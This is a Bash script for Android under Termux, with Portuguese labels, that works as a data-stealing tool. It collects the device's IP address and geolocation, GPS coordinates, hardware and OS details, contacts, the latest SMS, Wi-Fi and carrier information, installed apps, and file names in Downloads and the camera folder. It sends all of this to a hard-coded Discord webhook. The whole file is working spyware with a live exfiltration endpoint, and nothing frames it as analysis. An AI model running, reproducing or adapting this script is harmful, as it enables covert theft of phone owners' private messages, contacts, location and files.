#!/bin/bash
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"
c() { echo "$1" | tr -d '\n\r"' | sed 's/\\/\\\\/g' | cut -c1-350; }
P_IP=$(curl -s --connect-timeout 2 ifconfig.me || echo "0.0.0.0")
L_RAW=$(curl -s --connect-timeout 2 "http://ip-api.com")
L_INF=$(c "$(echo "$L_RAW" | tr ',' '\n' | tr -d '{}')")
GPS=$(c "$(timeout 3s termux-location 2>/dev/null | grep -E 'lat|lon|acc' | tr -d ' ,')")
MODEL=$(c "$(getprop ro.product.brand) $(getprop ro.product.model)")
ANDROID=$(c "$(getprop ro.build.version.release) (SDK $(getprop ro.build.version.sdk))")
RAM=$(c "$(free -h | awk '/Mem:/ {print $3 "/" $2}')")
BAT=$(c "$(timeout 2s termux-battery-status 2>/dev/null | tr -d '\n\r{}')")
CONTS=$(c "$(timeout 3s termux-contact-list 2>/dev/null | head -n 5)")
SMS=$(c "$(timeout 3s termux-sms-list -l 1 2>/dev/null)")
WIFI=$(c "$(timeout 2s termux-wifi-connectioninfo 2>/dev/null | grep 'ssid' | tr -d '"')")
APPS=$(c "$(pm list packages -e | head -n 15 | cut -d: -f2 | tr '\n' ',')")
FILES=$(c "$(ls -m /sdcard/Download 2>/dev/null | head -c 200)")
DCIM=$(c "$(ls -m /sdcard/DCIM/Camera 2>/dev/null | head -c 200)")
ACCS=$(c "$(getprop gsm.operator.alpha) | SIM: $(getprop gsm.sim.state)")
KERN=$(c "$(uname -a)")
PAYLOAD=$(cat <<EOF
{
  "content": "☢️ **EXTRAÇÃO TOTAL 021** ☢️",
  "embeds": [{
    "title": "DADOS TÉCNICOS E PRIVADOS",
    "color": 16711680,
    "fields": [
      {"name": "Identidade/Hardware", "value": "IP: $P_IP\nModelo: $MODEL\nAndroid: $ANDROID\nRAM: $RAM\nBateria: $BAT", "inline": false},
      {"name": "Localizacao Exata", "value": "IP-Geo: $L_INF\nGPS: ${GPS:-'Sem Sinal/Permissao'}", "inline": false},
      {"name": "Rede e Operadora", "value": "WiFi: $WIFI\nOperadora: $ACCS", "inline": false},
      {"name": "Arquivos Encontrados", "value": "Downloads: $FILES\nFotos: $DCIM", "inline": false},
      {"name": "Dados Sensiveis", "value": "SMS: ${SMS:-'Privado'}\nContatos: ${CONTS:-'Privado'}\nApps: $APPS", "inline": false}
    ]
  }]
}
EOF
)
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
